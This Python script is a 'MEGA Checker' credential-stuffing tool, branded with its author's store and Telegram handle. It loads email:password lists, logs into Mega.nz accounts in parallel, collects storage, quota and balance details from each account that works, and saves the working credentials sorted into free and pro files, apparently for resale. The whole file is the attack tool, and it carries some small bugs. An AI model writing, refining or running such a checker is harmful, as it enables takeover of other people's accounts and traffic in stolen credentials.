
# Importing required modules
import os
import time
import logging
from colorama import Fore, init
from mega import Mega
import traceback
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama and logging
init(autoreset=True)
logging.basicConfig(level=logging.INFO, format=f"{Fore.GREEN}%(message)s{Fore.RESET}")

# Initialize a set to keep track of already checked accounts
checked_accounts = set()

def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def save_valid_account(account_details, cap):
    if cap:
        """Save valid account details to a file."""
        if len(account_details['balance']) == 0 :    
            with open('valid_FREE.txt', 'a+', encoding="UTF-8") as file:
                file.write(f"Store: =----=======================----=\n")
                file.write(f"Author:=-----------Ggre55--------------=\n")
                file.write(f"Store: =----ggre55store.sellpass.io----=\n")
                file.write(f"Store: =------ggre55store.itch.io------=\n")
                file.write(f"     : =----=======================----=\n")
                file.write(f"Email: {account_details['email']}\n")
                file.write(f"Password: {account_details['password']}\n")
                file.write(f"Name: {account_details['name']}\n")
                file.write(f"Storage: {account_details['space']}\n")
                file.write(f"Account disk quota: {account_details['quota']}\n")
                file.write(f"Account balance: {account_details['balance']}\n")
                file.write("\n")
                file.write("\n")
        else:
            with open('valid_PRO.txt', 'a+', encoding="UTF-8") as file:
                file.write(f"Store: =----=======================----=\n")
                file.write(f"Author:=-----------Ggre55--------------=\n")
                file.write(f"Store: =----ggre55store.sellpass.io----=\n")
                file.write(f"Store: =------ggre55store.itch.io------=\n")
                file.write(f"     : =----=======================----=\n")
                file.write(f"Email: {account_details['email']}\n")
                file.write(f"Password: {account_details['password']}\n")
                file.write(f"Name: {account_details['name']}\n")
                file.write(f"Storage: {account_details['space']}\n")
                file.write(f"Account disk quota: {account_details['quota']}\n")
                file.write(f"Account balance: {account_details['balance']}\n")
                file.write("\n")
                file.write("\n")
    else:
        with open('valid.txt', 'a+', encoding="UTF-8") as file:
            file.write(f"Store: =----=======================----=\n")
            file.write(f"Author:=-----------Ggre55--------------=\n")
            file.write(f"Store: =----ggre55store.sellpass.io----=\n")
            file.write(f"Store: =------ggre55store.itch.io------=\n")
            file.write(f"     : =----=======================----=\n")
            file.write(f"Email: {account_details['email']}\n")
            file.write(f"Password: {account_details['password']}\n")
            file.write("\n")
            file.write("\n")
def check_account_status(email, password, cap):
    try:
        # Skip if the account has already been checked
        if email in checked_accounts:
            logging.warning(f"{Fore.YELLOW}Account {email} has already been checked. Skipping.{Fore.RESET}")
            return None

        # Log in to the Mega.nz account
        mega = Mega()
        m = mega.login(email, password)
        
        # Add the email to checked_accounts
        checked_accounts.add(email)

        time.sleep(1)

        # Get account details
        quota = m.get_quota()
        account_info = m.get_user()
        name = account_info['name']
        email = account_info['email']
        space = m.get_storage_space(mega=True)
        balance = m.get_balance()
        # Log and save the account details
        logging.info(f"Successfully logged into account {email}.")

        logging.info(f"Name: {name}, Quota: {quota}, Space: {space}")
        
        save_valid_account({'email': email, 'password': password, 
                            'quota': quota, 'name': name, 
                            'space': space, 'balance': balance,
                            }, cap)

        return {
            "name": name,
            "email": email,
            "quota": quota,
            "space": space
        }

    except Exception as e:
        logging.error(f"{Fore.RED}Failed to log into account {email}. Error: {e}{Fore.RESET}")
        logging.debug(traceback.format_exc())
        return None
    

banner = f"""{Fore.CYAN}
    __  __________________       ________              __            
   /  |/  / ____/ ____/   |     / ____/ /_  ___  _____/ /_____  _____
  / /|_/ / __/ / / __/ /| |    / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
 / /  / / /___/ /_/ / ___ |   / /___/ / / /  __/ /__/ ,< /  __/ /    
/_/  /_/_____/\____/_/  |_|   \____/_/ /_/\___/\___/_/|_|\___/_/   
                        {Fore.RESET}{Fore.RED}BY Ggre55 {Fore.RESET}{Fore.GREEN}V2.0.5 {Fore.RESET}
                        {Fore.YELLOW}Telegram: @DrWoop {Fore.RESET}
                        {Fore.YELLOW}Store: ggre55store.itch.io {Fore.RESET}
"""

# Main function for user interface and functionality
def main():
    # Clear the console screen for better readability
    clear_screen()
    print(f"{banner}")
    print("                     1. Check Accounts")
    option = input("Select an option: ").strip()

    if option == '1':
        # Load or generate keys
        key_file = input("Enter path to key file (leave empty to use deafault 'acc.txt'): ").strip()
        cap = input("Full Capture 'y/n'): ").lower
        if cap == "y":
            cap = True
        elif cap == "n":
            cap = False
        else:
            print("Invalid option. Please try again.")
        if key_file:
            try:
                accounts_to_check = []
                with open(f'{key_file}', 'r') as file:
                    print(f"Loaded {len(file)} Accounts.")  # Debug print
                    for line in file:
                        email, password = line.strip().split(':')
                        accounts_to_check.append({'email': email, 'password': password})
            except FileNotFoundError:
                print("No accounts file. Please make sure to provide valid file.")
                input()
                return
        else:
            try:
                accounts_to_check = []
                with open('acc.txt', 'r') as file:
                    for line in file:
                        email, password = line.strip().split(':')
                        accounts_to_check.append({'email': email, 'password': password})
            except FileNotFoundError:
                print("No accounts found. Please make sure to put accounts in acc.txt.")
                input()
                return
        with ThreadPoolExecutor() as executor:
            results = executor.map(lambda acc: check_account_status(acc['email'], acc['password'], cap), accounts_to_check)

        for result in results:
            if result:
                logging.info(f"{Fore.GREEN}Account {result['email']} checked successfully.{Fore.RESET}")
            else:
                logging.warning(f"{Fore.YELLOW}Failed to check an account.{Fore.RESET}")

    elif option == '2':
        # Load valid proxies
        pass
        
    else:
        print("Invalid option. Please try again.")
        exit(1)

    print("=== Completed ===")
    
# Run the main function
if __name__ == '__main__':
    main()
